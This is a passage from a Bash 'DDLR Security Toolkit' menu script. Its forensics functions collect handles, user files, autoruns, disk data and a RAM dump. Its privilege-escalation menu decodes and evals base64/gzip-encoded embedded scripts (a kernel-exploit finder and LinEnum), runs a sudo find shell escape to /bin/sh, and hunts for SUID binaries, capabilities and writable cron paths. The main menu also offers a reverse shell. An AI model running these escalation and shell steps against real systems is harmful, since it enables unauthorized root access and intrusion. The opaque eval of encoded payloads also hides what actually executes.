  # Create output file with date and time
  output_file="TriageDDLR/handles_$(date +"%Y%m%d_%H%M%S").txt"

  # List of handles
  echo "List of handles:" >> "$output_file"
  lsof >> "$output_file"
  echo >> "$output_file"
  cat "$output_file"
  echo "Handles listing completed. Output file: $output_file"
  
}

# Function to gather user data
gather_user_data() {
  # Create output file with date and time
  output_file="TriageDDLR/user_data_$(date +"%Y%m%d_%H%M%S").txt"

  # Hidden files in Users profiles
  echo "Hidden files in Users profiles:" >> "$output_file"
  find /home -name ".*" -type f >> "$output_file"
  echo >> "$output_file"

  # SSH know_host files
  echo "SSH know_host files:" >> "$output_file"
  find /home -name "known_hosts" -type f >> "$output_file"
  echo >> "$output_file"

  # /tmp content
  echo "/tmp content:" >> "$output_file"
  ls -al /tmp >> "$output_file"
  echo >> "$output_file"
  cat "$output_file"
  echo "User data collection completed. Output file: $output_file"
  
}

# Function to analyze autoruns
analyze_autoruns() {
  # Create output file with date and time
  output_file="TriageDDLR/autoruns_$(date +"%Y%m%d_%H%M%S").txt"

  # /etc/*.d
  echo "/etc/*.d:" >> "$output_file"
  ls -al /etc/*.d >> "$output_file"
  echo >> "$output_file"

  # /etc/crontab
  echo "/etc/crontab:" >> "$output_file"
  cat /etc/crontab >> "$output_file"
  echo >> "$output_file"

  # /etc/cron.*/
  echo "/etc/cron.*:" >> "$output_file"
  ls -al /etc/cron.* >> "$output_file"
  echo >> "$output_file"
  cat "$output_file"
  echo "Autoruns analysis completed. Output file: $output_file"
  
}

# Function to obtain disk information
get_disk_information() {
  # Create output file with date and time
  output_file="TriageDDLR/disk_information_$(date +"%Y%m%d_%H%M%S").txt"

  # List of partitions
  echo "List of partitions:" >> "$output_file"
  sudo fdisk -l >> "$output_file"
  echo >> "$output_file"

  # MBR
  echo "MBR:" >> "$output_file"
  sudo dd if=/dev/sda bs=512 count=1 2>/dev/null | hexdump -C >> "$output_file"
  echo >> "$output_file"

  # File System Information
  echo "File System Information:" >> "$output_file"
  df -h >> "$output_file"
  echo >> "$output_file"
  cat "$output_file"
  echo "Disk information retrieval completed. Output file: $output_file"
  
}

# Function to dump RAM memory
dump_ram_memory() {
  # Create dump file with date and time
  dump_file="TriageDDLR/ram_dump_$(date +"%Y%m%d_%H%M%S").bin"

  # Dump RAM memory using /dev/mem
  sudo dd if=/dev/mem of="$dump_file" bs=1M count=1024 status=progress

  echo "RAM memory dump completed. Dump file: $dump_file"
  
}

forensics() {

if ! command -v exiftool >/dev/null 2>&1; then
	echo "Need exiftool to work
	"
	read -p "Press enter to continue..."
	return
fi
if [ ! -d "TriageDDLR" ]; then
  mkdir "TriageDDLR"
fi
clear
if command -v figlet >/dev/null 2>&1; then
	figlet "DDLR Forensics" | lolcat
else 
	lecho "
________________________		
		DDLR Forensics
________________________"
fi
	
while true; do
    lecho "DDLR Forensics Menu:"
    lecho "1 - Generate DFIR file"
    lecho "2 - Diff files"
    lecho "3 - Gather system information"
    lecho "4 - Analyze connections"
    lecho "5 - List handles"
    lecho "6 - Gather user data"
    lecho "7 - Analyze autoruns"
    lecho "8 - Show disk information (requires root)"
    lecho "9 - Dump RAM memory (requires root)"
    lecho "10 - Back to main menu"
    echo

    read -rp "Enter your choice: " choice
    echo

    case $choice in
        1) dfir ;;
        2) differ ;;
        3) gather_system_information ;;
    	4) analyze_connections ;;
    	5) list_handles ;;
    	6) gather_user_data ;;
    	7) analyze_autoruns ;;
    	8) get_disk_information ;;
    	9) dump_ram_memory ;;
        10) break ;;
        *) echo "Invalid option. Please try again." ;;
    esac
done
}

privilege_escalation() {
  clear
  if command -v figlet >/dev/null 2>&1; then
    figlet "DDLR Privilege Escalation" | lolcat
  else
    lecho "
___________________________
	DDLR Privilege Escalation
___________________________"
  fi

  while true; do
    lecho "Select an option:"
    lecho "1. Find kernel exploits"
    lecho "2. Run LinEnum"
    lecho "3. sudo find"
    lecho "4. suid"
    lecho "5. GetCap"
    lecho "6. Cron"
    lecho "7. Writable paths"
    lecho "8. Back to main menu"
    read -p "Option: " option

    case $option in
      1)
        lecho "Find kernel exploits selected."
        decoded_script=$(echo "$compressed" | base64 -d | gzip -d)
    	eval "$decoded_script"
        ;;
      2)
        lecho "Run LinEnum selected."
        decoded_script=$(echo "$linenum" | base64 -d | gzip -d)
    	eval "$decoded_script"
        ;;
      3)
        lecho "SUDO selected."
        sudo find . -exec /bin/sh \; -quit
        ;;
      4)
        lecho "SUID selected."
        find / -perm /u=s -type f 2>/dev/null
        ;;
      5)
	  echo "GetCap selected."
	  cap_result=$(/usr/sbin/getcap -r / 2>/dev/null)
	  
	  if [[ $cap_result =~ .*CAP_SETUID.* ]]; then
	    echo "CAP_SETUID capability is set:"
	    echo "$cap_result"
	  else
	    echo "CAP_SETUID capability not found."
	  fi
	  ;;
      6)
        crontab_file="/etc/crontab"
        lecho "Cron selected."
        lecho "Checking if all files in cron exist..."

        if [[ ! -f "$crontab_file" ]]; then
          echo "Cron file does not exist: $crontab_file"
        else
          missing_files=0

          while IFS= read -r cron_entry; do
            if [[ "$cron_entry" =~ ^[[:space:]]*[^#]*[[:digit:]]+[[:space:]]+[^[:space:]]+[[:space:]]+[^[:space:]]+[[:space:]]+[^[:space:]]+[[:space:]]+[^[:space:]]+[[:space:]]+[^[:space:]]+$ ]]; then
              file_path=$(echo "$cron_entry" | awk '{print $NF}')
              
              if [[ -f "$file_path" ]]; then
                echo "File exists: $file_path"
              else
                if [[ "$file_path" != */* ]]; then
                  echo "User has write permissions to the path: ."
                  echo "Vulnerable file path: $file_path"
                else
                  directory=$(dirname "$file_path")
                  
                  if [[ -w "$directory" ]]; then
                    echo "User has write permissions to the path: $directory"
                    echo "Vulnerable file path: $file_path"
                  else
                    echo "User does not have write permissions to the path: $directory"
                  fi
                fi
                
                missing_files=$((missing_files + 1))
              fi
            fi
          done < "$crontab_file"

          echo "$missing_files file(s) in cron are missing."
        fi
        ;;
	7)
      	lecho "Listing writable paths"
     	find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
     	;;
	8)
        echo "Returning to the main menu."
        return
        ;;
      *)
        echo "Invalid option. Please select a valid option."
        ;;
    esac

    read -p "Press Enter to continue..."
    clear
  done
}


while true; do
#var1= "localhost"
#var2= "4444"
clear
if command -v figlet >/dev/null 2>&1; then
	figlet "DDLR Security Toolkit" | lolcat
else
	lecho "
	___________________________
	DDLR Security Toolkit
	___________________________"
fi
lecho "
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
v0.1 By www.diosdelared.com
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"

	lecho "Select an option:"
	lecho "1. Scrapper"
	lecho "2. Network scanner"
	lecho "3. Reverse shell"
	lecho "4. Privilege escalation"
	lecho "5. Forensics"
	lecho "99. Exit"
	read -p "Option: " opcion

	case $opcion in
		1)
			scrapper
			;;
		2)
			netscan
			;;
		3)
			reverse
			;;
		4)
			privilege_escalation
			;;
		5)
			forensics
			;;
		99)
			echo "Bye!"
			exit 0
			;;
		*)
			echo "Invalid option."
			;;
	esac

	read -p "Press enter to continue..."
	clear
done
